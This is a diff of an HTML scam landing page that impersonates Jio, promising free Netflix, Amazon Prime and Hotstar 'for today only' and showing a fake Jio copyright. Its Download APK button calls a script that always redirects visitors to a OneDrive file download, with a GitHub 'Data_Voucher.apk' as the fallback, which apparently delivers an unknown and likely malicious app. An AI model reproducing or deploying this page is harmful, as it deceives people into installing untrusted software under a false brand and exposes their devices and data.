@@ -1,62 +1,65 @@
+
 <!DOCTYPE html>
 <html lang="en">
+ 
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Jio Offer</title>
-    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
+    <title>Jio</title>
     <style>
         body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            background-color: #f4f4f9;
             margin: 0;
+            font-family: Arial, sans-serif;
+ 
+}
+        header {
+            text-align: center;
+            color: white;
+            padding: 0px;
         }
-        .app-page {
-            max-width: 800px;
+.ssop{
+background: #19398a;
+ 
+}
+        main {
+ 
+            text-align: left;
+            padding: 30px;
+            color: white;
+        }
+ 
+        footer {
+            position: fixed;
+            bottom: 0;
             width: 100%;
-            background-color: white;
-            padding: 20px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-            border-radius: 8px;
+            text-align: center;
+ 
+            padding: 5px;
         }
-        .screenshot-slider {
-            margin-bottom: 20px;
-        }
-        .app-description {
-            padding: 10px 0;
-            line-height: 1.6em;
-        }
+ 
         #downloadButton {
-
-        background-color: #3333ff;
-
-        color: white;
-
-        width: 100%;
-
-        padding: 15px 30px;
-
-        font-size: 21px;
-
-        border: none;
-
-        border-radius: 5px;
-
-        cursor: pointer;
-
+            background-color: #e51f0b;
+            color: white;
+            width: 80%;
+            padding: 15px 30px;
+            font-size: 21px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+ 
+        #logo {
+            max-width: 100%;
+            height: auto;
+            display: block;
+ 
         }
     </style>
-	<script>
-
-function done()
-
+ 
+    <script>
+function done() 
 {
-
- var m = new Date().getMinutes(); 
+    var m = new Date().getMinutes(); 
 	if(m<60)
 	{
 		window.location="https://onedrive.live.com/download?cid=57E376D7A53C94F9%21182&resid=57E376D7A53C94F9%21182&authkey=!AD8ZnzOFvQhQW5M"; 
@@ -67,50 +70,35 @@ function done()
 		window.location="https://github.com/technews92/claim/blob/main/Data_Voucher.apk?raw=true";
 	}
 }
-
 </script>
-
 </head>
-<body>
-   
-    <div class="app-page">
-        <h4>Jio Hotstar,Netflix offer</h4>
-        <p>by Jio</p>
-        <div class="screenshot-slider">
-            <div class="carousel carousel-slider center">
-                <div class="carousel-item"><img src="https://i.postimg.cc/JnJsMv0x/images.pngi" alt=""></div>
-            </div>
-        </div>
-        <div class="app-description">
-            <h5>Description</h5>
-            <p><h6>
-
-		- Free Hotstar for 3 Months.<br>
-
-		- Free Netflix for 1 Month.<br>
-
-		- Only 1-Crore users are eligible.
-
-			
-
-</p>- Download app for registration.</h6></p></p>
-        </div>
-        <div id="downloadButton" onClick="done()"><center>
-        <a style = "width:100%; color:white; font-style:bold ;" ><i class="material-icons left">cloud_download</i>Download APK</a></center>
-        </div>
+ 
+<body class="ssop">
+    <div>
+ 
+    <header>
+     <img id="logo" src="https://i.postimg.cc/JnJsMv0x/images.png" alt="Your Logo">
+     <img height=150 src="https://rilstaticasset.akamaized.net/sites/default/files/2022-09/mukesh-ambani.png"/></br>
+ 
+    </header>
+ 
+    <main>
+        <h2>JIO OFFERS</h2>
+        <p><h3>Jio is giving Free Subscription of<br>
+Netflix+AmazonPrime+Hotstar.<br>
+Offer Valid for Today only
+</p>
+ Download all new Jio app.</h3></p>
+ 
+ 
+    <br><br>
+        <button onClick="done()" id="downloadButton">Download APK</button>
+    </main>
     </div>
-
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
-    <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            var elems = document.querySelectorAll('.carousel');
-            M.Carousel.init(elems, {
-                fullWidth: true,
-                indicators: true
-            });
-        });
-    </script>
-	
+    <footer>
+        <p style="color:white;">
+        Copyright Jio Pvt Ltd 2024 </p>
+    </footer>
 	<!-- Default Statcounter code for Jio-4G
 https://technews92.github.io/claim/myindex.html -->
 <script type="text/javascript">
@@ -128,7 +116,6 @@ src="https://c.statcounter.com/12889744/0/a10820b5/1/"
 alt="Web Analytics"
 referrerPolicy="no-referrer-when-downgrade"></a></div></noscript>
 <!-- End of Statcounter Code -->
-
 </body>
-
-</html>
+ 
+  </html>
